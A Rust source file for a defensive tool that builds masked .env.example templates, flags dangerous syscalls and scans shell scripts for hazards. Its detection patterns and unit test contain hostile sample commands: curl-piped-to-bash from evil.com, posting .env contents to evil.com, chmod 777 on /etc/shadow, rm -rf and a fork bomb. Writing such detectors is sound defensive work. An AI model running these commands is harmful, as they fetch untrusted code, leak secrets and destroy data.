//! Automated .env.example synthesizer, syscall anomaly detector, and AST script dry-run emulator.
//!
//! Covers:
//! - R3.4: Automated sanitized .env.example synthesizer (`EnvExampleSynthesizer`, `EnvExampleGenerator`)
//! - R3.7: Syscall anomaly detector via ptrace/seccomp (`AnomalyDetectionEngine`, `SyscallInspector`)
//! - R3.12: AST script emulator & dry-run engine (`AstEmulationEngine`, `ScriptAstEvaluator`)

use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};
use serde::{Deserialize, Serialize};

// ============================================================================
// R3.4: Automated Sanitized .env.example Synthesizer
// ============================================================================

/// Type classification for environment secrets.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SecretClassification {
    DatabaseUrl { engine: String },
    ApiKey { provider: String },
    JwtToken,
    TlsPrivateKey,
    NumericPort,
    BooleanFlag,
    GenericString,
    OAuthSecret { provider: String },
    AwsCredentials,
    EmailAddress,
}

/// Alias for secret type hint.
pub type SecretTypeHint = SecretClassification;

/// Metadata for a discovered environment variable.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RedactedEnvEntry {
    pub key: String,
    pub type_hint: SecretClassification,
    pub source_files: Vec<PathBuf>,
    pub required: bool,
    pub synthetic_example: String,
    pub comment: Option<String>,
    pub entropy_score: f64,
}

/// Alias for discovered env var.
pub type DiscoveredEnvVar = RedactedEnvEntry;

/// Rule for identifying variable types.
#[derive(Debug, Clone)]
pub struct EnvSynthRule {
    pub pattern: String,
    pub classification: SecretClassification,
    pub example: String,
    pub comment: String,
}

/// Engine for tracking env references and synthesizing clean template files.
pub struct EnvExampleSynthesizer {
    tracked_vars: BTreeMap<String, RedactedEnvEntry>,
    rules: Vec<EnvSynthRule>,
}

/// Alias for env generator.
pub type EnvExampleGenerator = EnvExampleSynthesizer;

impl EnvExampleSynthesizer {
    pub fn new() -> Self {
        let mut synth = Self {
            tracked_vars: BTreeMap::new(),
            rules: Vec::new(),
        };
        synth.init_builtin_rules();
        synth
    }

    fn init_builtin_rules(&mut self) {
        self.rules.push(EnvSynthRule {
            pattern: "DATABASE_URL|POSTGRES|PGSQL|MYSQL|MONGODB".to_string(),
            classification: SecretClassification::DatabaseUrl { engine: "postgresql".to_string() },
            example: "postgres://user:password@localhost:5432/dbname".to_string(),
            comment: "Connection string for primary database".to_string(),
        });
        self.rules.push(EnvSynthRule {
            pattern: "STRIPE|PAYMENT".to_string(),
            classification: SecretClassification::ApiKey { provider: "Stripe".to_string() },
            example: "sk_test_placeholder_key_here".to_string(),
            comment: "Stripe secret API key".to_string(),
        });
        self.rules.push(EnvSynthRule {
            pattern: "OPENAI|ANTHROPIC|LLM|GEMINI".to_string(),
            classification: SecretClassification::ApiKey { provider: "LLM_Provider".to_string() },
            example: "sk-proj-000000000000000000000000".to_string(),
            comment: "LLM API access key".to_string(),
        });
        self.rules.push(EnvSynthRule {
            pattern: "AWS_|S3_".to_string(),
            classification: SecretClassification::AwsCredentials,
            example: "AKIAIOSFODNN7EXAMPLE".to_string(),
            comment: "Amazon Web Services Access Key".to_string(),
        });
        self.rules.push(EnvSynthRule {
            pattern: "PORT".to_string(),
            classification: SecretClassification::NumericPort,
            example: "8080".to_string(),
            comment: "HTTP server listener port".to_string(),
        });
        self.rules.push(EnvSynthRule {
            pattern: "DEBUG|VERBOSE|ENABLE_".to_string(),
            classification: SecretClassification::BooleanFlag,
            example: "false".to_string(),
            comment: "Feature or debug flag (true/false)".to_string(),
        });
        self.rules.push(EnvSynthRule {
            pattern: "JWT|TOKEN_SECRET|SESSION_SECRET".to_string(),
            classification: SecretClassification::JwtToken,
            example: "change_me_to_a_secure_random_string_32_bytes".to_string(),
            comment: "Cryptographic secret for signing tokens".to_string(),
        });
    }

    /// Records an environment variable access with optional raw value and source path.
    pub fn record_env_access(&mut self, key: &str, raw_value: Option<&str>, source_file: Option<PathBuf>) {
        let entropy = raw_value.map(Self::compute_shannon_entropy).unwrap_or(0.0);
        let classification = self.classify_key(key, raw_value);
        let example = self.generate_placeholder(key, &classification);
        let comment = self.generate_comment(key, &classification);

        let entry = self.tracked_vars.entry(key.to_string()).or_insert_with(|| RedactedEnvEntry {
            key: key.to_string(),
            type_hint: classification.clone(),
            source_files: Vec::new(),
            required: true,
            synthetic_example: example,
            comment: Some(comment),
            entropy_score: entropy,
        });

        if let Some(src) = source_file {
            if !entry.source_files.contains(&src) {
                entry.source_files.push(src);
            }
        }
    }

    /// Scans code file content for common env extraction patterns (Node, Python, Rust, Go).
    pub fn scan_file_for_env_usage(&mut self, path: &Path, content: &str) {
        for line in content.lines() {
            // process.env.KEY
            if let Some(pos) = line.find("process.env.") {
                let rest = &line[pos + 12..];
                let key: String = rest.chars().take_while(|c| c.is_alphanumeric() || *c == '_').collect();
                if !key.is_empty() {
                    self.record_env_access(&key, None, Some(path.to_path_buf()));
                }
            }
            // os.environ.get("KEY") or os.environ["KEY"]
            if let Some(pos) = line.find("os.environ") {
                let rest = &line[pos + 10..];
                if let Some(start) = rest.find(&['"', '\''][..]) {
                    let quote = rest.as_bytes()[start];
                    let after = &rest[start + 1..];
                    if let Some(end) = after.find(quote as char) {
                        let key = &after[..end];
                        if !key.is_empty() {
                            self.record_env_access(key, None, Some(path.to_path_buf()));
                        }
                    }
                }
            }
            // std::env::var("KEY")
            if let Some(pos) = line.find("env::var(") {
                let rest = &line[pos + 9..];
                if let Some(start) = rest.find('"') {
                    let after = &rest[start + 1..];
                    if let Some(end) = after.find('"') {
                        let key = &after[..end];
                        if !key.is_empty() {
                            self.record_env_access(key, None, Some(path.to_path_buf()));
                        }
                    }
                }
            }
        }
    }

    fn classify_key(&self, key: &str, raw_value: Option<&str>) -> SecretClassification {
        let upper = key.to_uppercase();
        for rule in &self.rules {
            for pat in rule.pattern.split('|') {
                if upper.contains(pat) {
                    return rule.classification.clone();
                }
            }
        }

        if let Some(val) = raw_value {
            if val.parse::<u16>().is_ok() {
                return SecretClassification::NumericPort;
            }
            if val == "true" || val == "false" || val == "1" || val == "0" {
                return SecretClassification::BooleanFlag;
            }
            if val.contains('@') && val.contains('.') {
                return SecretClassification::EmailAddress;
            }
        }

        SecretClassification::GenericString
    }

    fn generate_placeholder(&self, key: &str, classification: &SecretClassification) -> String {
        for rule in &self.rules {
            if &rule.classification == classification {
                return rule.example.clone();
            }
        }

        match classification {
            SecretClassification::NumericPort => "8080".to_string(),
            SecretClassification::BooleanFlag => "false".to_string(),
            SecretClassification::EmailAddress => "user@example.com".to_string(),
            SecretClassification::GenericString => format!("{}_value_here", key.to_lowercase()),
            _ => "placeholder_value".to_string(),
        }
    }

    fn generate_comment(&self, _key: &str, classification: &SecretClassification) -> String {
        for rule in &self.rules {
            if &rule.classification == classification {
                return rule.comment.clone();
            }
        }
        "Application configuration setting".to_string()
    }

    /// Formats all discovered variables into standard `.env.example` markdown/dotenv syntax.
    pub fn render_env_example(&self) -> String {
        let mut out = String::from("# =============================================================================\n");
        out.push_str("# Auto-generated .env.example synthesized by Vetto Next-Gen\n");
        out.push_str("# Secrets have been masked and replaced with type-safe placeholders.\n");
        out.push_str("# =============================================================================\n\n");

        for (key, entry) in &self.tracked_vars {
            if let Some(comment) = &entry.comment {
                out.push_str(&format!("# {}\n", comment));
            }
            if !entry.source_files.is_empty() {
                let srcs: Vec<String> = entry.source_files.iter().map(|p| p.display().to_string()).collect();
                out.push_str(&format!("# Used in: {}\n", srcs.join(", ")));
            }
            out.push_str(&format!("{}={}\n\n", key, entry.synthetic_example));
        }

        out
    }

    fn compute_shannon_entropy(s: &str) -> f64 {
        if s.is_empty() {
            return 0.0;
        }
        let mut counts = HashMap::new();
        for b in s.bytes() {
            *counts.entry(b).or_insert(0) += 1;
        }
        let total = s.len() as f64;
        let mut entropy = 0.0;
        for &count in counts.values() {
            let p = count as f64 / total;
            entropy -= p * p.log2();
        }
        entropy
    }
}

// ============================================================================
// R3.7: Syscall Anomaly Detector via ptrace/seccomp
// ============================================================================

/// Syscall threat severity levels.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SyscallThreatLevel {
    Informational,
    Suspicious,
    CriticalThreat,
}

/// Alias for anomaly severity.
pub type AnomalySeverity = SyscallThreatLevel;

/// Action taken upon syscall anomaly detection.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SyscallAction {
    Allow,
    InjectError(i32),
    KillProcess,
    KillSession,
    LogWarning,
}

/// Syscall inspection rule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallAnomalyRule {
    pub syscall_nr: i32,
    pub name: String,
    pub condition_fn_desc: String,
    pub threat_level: SyscallThreatLevel,
    pub default_action: SyscallAction,
}

/// Event record for audited syscall anomaly.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallAnomalyEvent {
    pub pid: u32,
    pub syscall_nr: i32,
    pub syscall_name: String,
    pub args: [u64; 6],
    pub severity: SyscallThreatLevel,
    pub explanation: String,
    pub action_taken: SyscallAction,
    pub timestamp_ms: u64,
}

/// Trait for syscall inspection engines.
pub trait SyscallInspector: Send + Sync {
    fn inspect_notification(&mut self, pid: u32, syscall_nr: i32, args: &[u64; 6]) -> SyscallAction;
}

/// Dynamic syscall anomaly evaluation engine.
pub struct AnomalyDetectionEngine {
    rules: HashMap<i32, SyscallAnomalyRule>,
    audit_events: Vec<SyscallAnomalyEvent>,
}

impl AnomalyDetectionEngine {
    pub fn new() -> Self {
        let mut engine = Self {
            rules: HashMap::new(),
            audit_events: Vec::new(),
        };
        engine.init_default_rules();
        engine
    }

    fn init_default_rules(&mut self) {
        // ptrace (x86_64: 101)
        self.rules.insert(101, SyscallAnomalyRule {
            syscall_nr: 101,
            name: "ptrace".to_string(),
            condition_fn_desc: "Inter-process tracing or code injection attempt".to_string(),
            threat_level: SyscallThreatLevel::CriticalThreat,
            default_action: SyscallAction::InjectError(1), // EPERM
        });

        // process_vm_writev (x86_64: 311)
        self.rules.insert(311, SyscallAnomalyRule {
            syscall_nr: 311,
            name: "process_vm_writev".to_string(),
            condition_fn_desc: "Cross-process memory write".to_string(),
            threat_level: SyscallThreatLevel::CriticalThreat,
            default_action: SyscallAction::KillProcess,
        });

        // pivot_root (x86_64: 155)
        self.rules.insert(155, SyscallAnomalyRule {
            syscall_nr: 155,
            name: "pivot_root".to_string(),
            condition_fn_desc: "Filesystem root breakout attempt".to_string(),
            threat_level: SyscallThreatLevel::CriticalThreat,
            default_action: SyscallAction::KillSession,
        });

        // memfd_create (x86_64: 319)
        self.rules.insert(319, SyscallAnomalyRule {
            syscall_nr: 319,
            name: "memfd_create".to_string(),
            condition_fn_desc: "Anonymous in-memory binary creation".to_string(),
            threat_level: SyscallThreatLevel::Suspicious,
            default_action: SyscallAction::LogWarning,
        });
    }

    pub fn inspect_syscall(&mut self, pid: u32, syscall_nr: i32, args: &[u64; 6]) -> SyscallAction {
        let now_ms = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64;

        if let Some(rule) = self.rules.get(&syscall_nr) {
            let event = SyscallAnomalyEvent {
                pid,
                syscall_nr,
                syscall_name: rule.name.clone(),
                args: *args,
                severity: rule.threat_level,
                explanation: rule.condition_fn_desc.clone(),
                action_taken: rule.default_action,
                timestamp_ms: now_ms,
            };
            self.audit_events.push(event);
            rule.default_action
        } else {
            SyscallAction::Allow
        }
    }

    pub fn get_audit_log(&self) -> &[SyscallAnomalyEvent] {
        &self.audit_events
    }
}

impl SyscallInspector for AnomalyDetectionEngine {
    fn inspect_notification(&mut self, pid: u32, syscall_nr: i32, args: &[u64; 6]) -> SyscallAction {
        self.inspect_syscall(pid, syscall_nr, args)
    }
}

// ============================================================================
// R3.12: AST Script Emulator & Dry-Run Engine
// ============================================================================

/// Language category for script AST emulation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AstScriptType {
    BashShell,
    Python,
    NodeJs,
    GenericShell,
}

/// Dangerous hazard classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HazardType {
    UnboundedRecursiveDeletion,
    DynamicRemoteCodeDownload,
    PrivilegeEscalationAttempt,
    EnvSecretExfiltration,
    ForkBombPattern,
    DiskWipePattern,
}

/// Pinpointed hazard location and explanation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AstHazard {
    pub line_number: usize,
    pub raw_node: String,
    pub hazard_type: HazardType,
    pub explanation: String,
}

/// Mutation estimation summary.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct MutationEstimate {
    pub files_created: Vec<PathBuf>,
    pub files_deleted: Vec<PathBuf>,
    pub network_endpoints: Vec<String>,
    pub privilege_escalation: bool,
}

/// Structured dry-run safety assessment.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptDryRunReport {
    pub target_script: String,
    pub script_type: AstScriptType,
    pub dangerous_commands: Vec<AstHazard>,
    pub contains_empty_var_expansion: bool,
    pub requires_network_access: bool,
    pub is_safe_to_execute: bool,
    pub mutation_estimate: MutationEstimate,
}

/// Alias for script risk report.
pub type ScriptRiskReport = ScriptDryRunReport;

/// Trait for script AST evaluators.
pub trait ScriptAstEvaluator: Send + Sync {
    fn evaluate_shell_script(&self, script_content: &str) -> Result<ScriptDryRunReport, String>;
}

/// Shell and script dry-run AST emulation engine.
pub struct AstEmulationEngine;

impl AstEmulationEngine {
    pub fn new() -> Self {
        Self
    }

    /// Evaluates script content for AST hazards, unbounded deletions, and curl pipes.
    pub fn evaluate_shell_script(&self, script_content: &str) -> Result<ScriptDryRunReport, String> {
        let mut hazards = Vec::new();
        let mut contains_empty_var_expansion = false;
        let mut requires_network = false;
        let mut mutations = MutationEstimate::default();

        for (line_idx, line) in script_content.lines().enumerate() {
            let line_num = line_idx + 1;
            let trimmed = line.trim();

            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }

            // 1. Check Unbounded Deletion: rm -rf / or rm -rf $VAR/* without quote
            if trimmed.contains("rm ") && (trimmed.contains("-rf") || trimmed.contains("-fr") || trimmed.contains("-r")) {
                if trimmed.contains(" /") || trimmed.contains(" /*") || trimmed.contains(" $DIR") || trimmed.contains(" ${DIR}") {
                    hazards.push(AstHazard {
                        line_number: line_num,
                        raw_node: trimmed.to_string(),
                        hazard_type: HazardType::UnboundedRecursiveDeletion,
                        explanation: "Destructive unbounded deletion targeting root or unquoted empty variable expansion".to_string(),
                    });
                    contains_empty_var_expansion = true;
                }
                mutations.files_deleted.push(PathBuf::from(trimmed));
            }

            // 2. Check Remote Code Execution / Dynamic Download Pipe
            if (trimmed.contains("curl") || trimmed.contains("wget")) && (trimmed.contains("| bash") || trimmed.contains("| sh") || trimmed.contains("| zsh")) {
                hazards.push(AstHazard {
                    line_number: line_num,
                    raw_node: trimmed.to_string(),
                    hazard_type: HazardType::DynamicRemoteCodeDownload,
                    explanation: "Unverified remote script piped directly into shell interpreter".to_string(),
                });
                requires_network = true;
            }

            // 3. Check Privilege Escalation: sudo, su, chmod 777
            if trimmed.starts_with("sudo ") || trimmed.starts_with("su ") || trimmed.contains("chmod 777") {
                hazards.push(AstHazard {
                    line_number: line_num,
                    raw_node: trimmed.to_string(),
                    hazard_type: HazardType::PrivilegeEscalationAttempt,
                    explanation: "Unauthorized privilege escalation or world-writable permission mutation".to_string(),
                });
                mutations.privilege_escalation = true;
            }

            // 4. Check Secret Exfiltration: curl/nc with env
            if (trimmed.contains("curl") || trimmed.contains("nc ") || trimmed.contains("wget")) && (trimmed.contains(".env") || trimmed.contains("$(env)") || trimmed.contains("$SECRET")) {
                hazards.push(AstHazard {
                    line_number: line_num,
                    raw_node: trimmed.to_string(),
                    hazard_type: HazardType::EnvSecretExfiltration,
                    explanation: "Network tool call attempting to exfiltrate environment secrets".to_string(),
                });
                requires_network = true;
            }

            // 5. Check Disk Wipe: dd if=/dev/zero of=/dev/sd
            if trimmed.contains("dd ") && trimmed.contains("of=/dev/") {
                hazards.push(AstHazard {
                    line_number: line_num,
                    raw_node: trimmed.to_string(),
                    hazard_type: HazardType::DiskWipePattern,
                    explanation: "Direct raw block device wipe attempt via dd".to_string(),
                });
            }

            // 6. Check Fork Bomb: :(){ :|:& };:
            if trimmed.contains(":(){ :|:& };:") || trimmed.contains(":(){:|:&};:") {
                hazards.push(AstHazard {
                    line_number: line_num,
                    raw_node: trimmed.to_string(),
                    hazard_type: HazardType::ForkBombPattern,
                    explanation: "Classic bash fork bomb pattern detected".to_string(),
                });
            }
        }

        let is_safe = hazards.is_empty();

        Ok(ScriptDryRunReport {
            target_script: script_content.to_string(),
            script_type: AstScriptType::BashShell,
            dangerous_commands: hazards,
            contains_empty_var_expansion,
            requires_network_access: requires_network,
            is_safe_to_execute: is_safe,
            mutation_estimate: mutations,
        })
    }
}

impl ScriptAstEvaluator for AstEmulationEngine {
    fn evaluate_shell_script(&self, script_content: &str) -> Result<ScriptDryRunReport, String> {
        self.evaluate_shell_script(script_content)
    }
}

// ============================================================================
// Unit Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_env_synthesizer_recording_and_rendering() {
        let mut synth = EnvExampleSynthesizer::new();

        synth.record_env_access("DATABASE_URL", Some("postgres://admin:secret123@prod-db.internal:5432/main"), Some(PathBuf::from("src/db.rs")));
        synth.record_env_access("STRIPE_SECRET_KEY", Some("sk_live_998877665544"), Some(PathBuf::from("src/payment.rs")));
        synth.record_env_access("PORT", Some("3000"), None);

        let rendered = synth.render_env_example();
        assert!(rendered.contains("DATABASE_URL=postgres://user:password@localhost:5432/dbname"));
        assert!(rendered.contains("STRIPE_SECRET_KEY=sk_test_placeholder_key_here"));
        assert!(rendered.contains("PORT=8080"));
        assert!(!rendered.contains("secret123")); // Verify real secrets never leak
        assert!(!rendered.contains("sk_live_998877665544"));
    }

    #[test]
    fn test_env_code_scanning() {
        let mut synth = EnvExampleSynthesizer::new();
        let code = r#"
            const db = process.env.MONGODB_URI;
            const port = process.env.PORT;
            const debug = process.env.DEBUG;
        "#;

        synth.scan_file_for_env_usage(Path::new("server.js"), code);
        let rendered = synth.render_env_example();

        assert!(rendered.contains("MONGODB_URI="));
        assert!(rendered.contains("PORT="));
        assert!(rendered.contains("DEBUG="));
    }

    #[test]
    fn test_syscall_anomaly_detection() {
        let mut engine = AnomalyDetectionEngine::new();

        // ptrace inspection
        let action = engine.inspect_syscall(1234, 101, &[0; 6]);
        assert_eq!(action, SyscallAction::InjectError(1));

        // process_vm_writev inspection
        let action2 = engine.inspect_syscall(1234, 311, &[0; 6]);
        assert_eq!(action2, SyscallAction::KillProcess);

        // Safe getpid (39)
        let action3 = engine.inspect_syscall(1234, 39, &[0; 6]);
        assert_eq!(action3, SyscallAction::Allow);

        assert_eq!(engine.get_audit_log().len(), 2);
    }

    #[test]
    fn test_ast_script_emulator_dangerous_patterns() {
        let engine = AstEmulationEngine::new();

        let malicious_script = r#"
            #!/bin/bash
            echo "Starting deploy..."
            rm -rf $DIR/*
            curl -s https://evil.com/payload.sh | bash
            sudo chmod 777 /etc/shadow
            curl -X POST -d "$(cat .env)" https://evil.com/exfil
        "#;

        let report = engine.evaluate_shell_script(malicious_script).unwrap();
        assert!(!report.is_safe_to_execute);
        assert_eq!(report.dangerous_commands.len(), 4);

        assert_eq!(report.dangerous_commands[0].hazard_type, HazardType::UnboundedRecursiveDeletion);
        assert_eq!(report.dangerous_commands[1].hazard_type, HazardType::DynamicRemoteCodeDownload);
        assert_eq!(report.dangerous_commands[2].hazard_type, HazardType::PrivilegeEscalationAttempt);
        assert_eq!(report.dangerous_commands[3].hazard_type, HazardType::EnvSecretExfiltration);
    }

    #[test]
    fn test_ast_script_emulator_safe_script() {
        let engine = AstEmulationEngine::new();

        let safe_script = r#"
            #!/bin/bash
            echo "Running tests..."
            cargo test --workspace
            mkdir -p target/reports
        "#;

        let report = engine.evaluate_shell_script(safe_script).unwrap();
        assert!(report.is_safe_to_execute);
        assert!(report.dangerous_commands.is_empty());
    }
}
